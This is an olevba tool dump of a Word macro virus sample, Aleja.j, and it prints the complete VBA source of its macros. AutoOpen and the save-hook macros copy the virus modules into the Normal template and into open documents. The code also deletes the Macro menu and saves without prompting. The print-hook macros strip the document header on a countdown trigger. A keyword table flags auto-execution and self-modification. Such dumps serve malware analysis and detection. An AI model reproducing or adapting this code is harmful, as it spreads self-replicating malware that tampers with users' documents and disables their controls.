olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Aleja.j-6d5baa4c358a192eb647ae6c71b5f72bcc627b2d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Aleja.j-6d5baa4c358a192eb647ae6c71b5f72bcc627b2d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Aleja.j-6d5baa4c358a192eb647ae6c71b5f72bcc627b2d - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Aleja.j-6d5baa4c358a192eb647ae6c71b5f72bcc627b2d - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()

On Error Resume Next



Options.VirusProtection = True
CommandBars("Tools").Controls("Macro").Delete

Dim modulo(6) As String
Dim n As Integer

Version = GetSetting(appname:="", Section:="Inicio", _
                       Key:="Version", Default:="2")

If Version <= 2 Then

SaveSetting appname:="", Section:="Inicio", _
                Key:="Version", setting:=2



n = 6
modulo(1) = "AutoClose"
modulo(2) = "AutoOpen"
modulo(3) = "ArchivoGuardar"
modulo(4) = "ArchivoGuardarComo"
modulo(5) = "ArchivoImprimir"
modulo(6) = "ArchivoImprimirPredeter"


For m = 1 To n

existe = False

For Each VBComponent In NormalTemplate.VBProject.VBComponents
    
    If VBComponent.Name = modulo(m) Then
            existe = True
    End If
Next VBComponent

If Not existe Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
            Destination:=NormalTemplate.FullName, Name:=modulo(m), _
            Object:=wdOrganizerObjectProjectItems
End If

existe = False

For Each VBComponent In ActiveDocument.VBProject.VBComponents
    
    If VBComponent.Name = modulo(m) Then
            existe = True
    End If
Next VBComponent

If Not existe Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
            Destination:=ActiveDocument.FullName, Name:=modulo(m), _
            Object:=wdOrganizerObjectProjectItems
End If

Next



Documents.Save NoPrompt:=True, OriginalFormat:=wdWordDocument

End If


End Sub

-------------------------------------------------------------------------------
VBA MACRO ArchivoGuardar.bas 
in file: Virus.MSWord.Aleja.j-6d5baa4c358a192eb647ae6c71b5f72bcc627b2d - OLE stream: 'Macros/VBA/ArchivoGuardar'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub MAIN()

On Error Resume Next

Options.VirusProtection = True
CommandBars("Tools").Controls("Macro").Delete

Dim modulo(6) As String
Dim n As Integer


Version = GetSetting(appname:="", Section:="Inicio", _
                       Key:="Version", Default:="2")

If Version <= 2 Then

SaveSetting appname:="", Section:="Inicio", _
                Key:="Version", setting:=2


n = 6
modulo(1) = "AutoClose"
modulo(2) = "AutoOpen"
modulo(3) = "ArchivoGuardar"
modulo(4) = "ArchivoGuardarComo"
modulo(5) = "ArchivoImprimir"
modulo(6) = "ArchivoImprimirPredeter"


For m = 1 To n


existe = False

For Each VBComponent In ActiveDocument.VBProject.VBComponents
    
    If VBComponent.Name = modulo(m) Then
            existe = True
    End If
Next VBComponent

If Not existe Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
            Destination:=ActiveDocument.FullName, Name:=modulo(m), _
            Object:=wdOrganizerObjectProjectItems
End If

Next

Documents.Save NoPrompt:=True, OriginalFormat:=wdWordDocument

Else

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO ArchivoGuardarComo.bas 
in file: Virus.MSWord.Aleja.j-6d5baa4c358a192eb647ae6c71b5f72bcc627b2d - OLE stream: 'Macros/VBA/ArchivoGuardarComo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub MAIN()

On Error Resume Next


Options.VirusProtection = True
CommandBars("Tools").Controls("Macro").Delete



Dim modulo(6) As String
Dim n As Integer

Version = GetSetting(appname:="", Section:="Inicio", _
                       Key:="Version", Default:="2")

If Version <= 2 Then

SaveSetting appname:="", Section:="Inicio", _
                Key:="Version", setting:=2


n = 6
modulo(1) = "AutoClose"
modulo(2) = "AutoOpen"
modulo(3) = "ArchivoGuardar"
modulo(4) = "ArchivoGuardarComo"
modulo(5) = "ArchivoImprimir"
modulo(6) = "ArchivoImprimirPredeter"




For m = 1 To n

existe = False

For Each VBComponent In ActiveDocument.VBProject.VBComponents
    
    If VBComponent.Name = modulo(m) Then
            existe = True
    End If
Next VBComponent

If Not existe Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
            Destination:=ActiveDocument.FullName, Name:=modulo(m), _
            Object:=wdOrganizerObjectProjectItems
End If

Next


If Dialogs(wdDialogFileSaveAs).Show = -1 Then
    Documents.Save NoPrompt:=True, OriginalFormat:=wdWordDocument
End If


End If

End Sub




-------------------------------------------------------------------------------
VBA MACRO ArchivoImprimir.bas 
in file: Virus.MSWord.Aleja.j-6d5baa4c358a192eb647ae6c71b5f72bcc627b2d - OLE stream: 'Macros/VBA/ArchivoImprimir'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()

Valor = GetSetting(appname:="Aleja5", Section:="Inicio", _
                       Key:="Valor", Default:="50")

If Valor = 0 Then

With ActiveDocument.Sections(1)
    .Headers(wdHeaderFooterPrimary).Range.Cut
    .Headers(wdHeaderFooterPrimary).Range.Text = ""
    .Headers(wdHeaderFooterPrimary).Range.Font.Size = 12
    .Headers(wdHeaderFooterPrimary).Range.Font.Bold = True
End With

Dialogs(wdDialogFilePrint).Show

With ActiveDocument.Sections(1)
    .Headers(wdHeaderFooterPrimary).Range.Paste
End With

Valor = GetSetting(appname:="Aleja5", Section:="Inicio", _
                       Key:="Valor", Default:="50")

SaveSetting appname:="Aleja5", Section:="Inicio", _
            Key:="Valor", setting:=(1)
Else
    Dialogs(wdDialogFilePrint).Show
    SaveSetting appname:="Aleja5", Section:="Inicio", _
                Key:="Valor", setting:=(Valor - 1)
End If

End Sub


-------------------------------------------------------------------------------
VBA MACRO ArchivoImprimirPredeter.bas 
in file: Virus.MSWord.Aleja.j-6d5baa4c358a192eb647ae6c71b5f72bcc627b2d - OLE stream: 'Macros/VBA/ArchivoImprimirPredeter'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()

Valor = GetSetting(appname:="Aleja5", Section:="Inicio", _
                       Key:="Valor", Default:="50")

If Valor = 0 Then

With ActiveDocument.Sections(1)
    .Headers(wdHeaderFooterPrimary).Range.Cut
    .Headers(wdHeaderFooterPrimary).Range.Text = ""
    .Headers(wdHeaderFooterPrimary).Range.Font.Size = 12
    .Headers(wdHeaderFooterPrimary).Range.Font.Bold = True
End With

ActiveDocument.PrintOut

With ActiveDocument.Sections(1)
    .Headers(wdHeaderFooterPrimary).Range.Paste
End With

Valor = GetSetting(appname:="Aleja5", Section:="Inicio", _
                       Key:="Valor", Default:="50")

SaveSetting appname:="Aleja5", Section:="Inicio", _
            Key:="Valor", setting:=(1)
Else
    ActiveDocument.PrintOut
    SaveSetting appname:="Aleja5", Section:="Inicio", _
                Key:="Valor", setting:=(Valor - 1)
End If

End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

